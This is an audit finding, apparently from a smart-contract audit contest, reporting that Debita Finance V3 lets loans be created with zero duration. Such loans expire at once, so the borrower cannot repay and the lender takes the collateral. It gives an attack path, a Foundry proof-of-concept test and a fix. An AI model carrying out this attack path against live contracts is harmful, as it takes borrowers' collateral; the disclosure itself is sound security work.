# Borrower loses ability to repay loan due to zero-duration loan exploit

### Summary

A missing duration validation check will cause borrowers to lose their repayment ability as the loan immediately expires, forcing them to forfeit their collateral to lenders through the zero-duration loan mechanism.

### Root Cause

In [DebitaLendOfferFactory.sol:124](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L124)  and [DebitaBorrowOffer-Factory.sol:75](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaBorrowOffer-Factory.sol#L75) the validation for loan duration allows zero-duration loans to be created when both borrower's and lender's min/max durations are set to 0.

### Internal pre-conditions

1. Borrower needs to create a borrow offer with `duration = 0`
2. Lender needs to create a lending offer with `minDuration = 0` and `maxDuration = 0`
3. The loan contract needs to allow matching of these offers

### External pre-conditions

_No response_

### Attack Path

1. Attacker identifies a borrow offer with `duration = 0`
2. Attacker creates a lending offer with: `minDuration = 0` and `maxDuration`= 0
3. The offers match and create a loan with zero duration
4. The loan immediately becomes "expired" due to zero duration
5. Borrower cannot repay the loan as it's already expired
6. Lender can claim the collateral through `claimCollateralAsLender()`

### Impact

The borrower suffers a complete loss of their collateral. The attacker gains the collateral while only providing the principle amount.

### PoC

```solidity
// Modify `test/local/Loan/TwoLendersERC20Loan.t.sol`
// Replace duration arguments with `0` in the setUp() function 
// Add this test to run the PoC
    function testPoC() public {
        matchOffers();
        DebitaV3Loan.LoanData memory loanData = DebitaV3LoanContract
            .getLoanData();
        uint[] memory indexes = allDynamicData.getDynamicUintArray(2);
        indexes[0] = 0;
        indexes[1] = 1;

        vm.warp(block.timestamp + 1);

        vm.startPrank(borrower);
        AEROContract.approve(address(DebitaV3LoanContract), 6e18);

        vm.expectRevert();
        DebitaV3LoanContract.payDebt(indexes);

        vm.expectRevert();
        DebitaV3LoanContract.claimCollateralAsBorrower(indexes);
        vm.stopPrank();

        uint balanceBeforeFirstLender = USDCContract.balanceOf(firstLender);
        vm.prank(firstLender);
        DebitaV3LoanContract.claimCollateralAsLender(0);

        uint balanceAfterFirstLender = USDCContract.balanceOf(firstLender);

        assertGt(
            balanceAfterFirstLender,
            balanceBeforeFirstLender
        );
    }
```
### Mitigation

1. Add duration validation in both borrow and lend offer creation:
```solidity
require(
        duration > 0,
        "Duration must be greater than zero"
    );
 ```
2. Also add similar checks in the lending offer contract to prevent zero-duration loans.
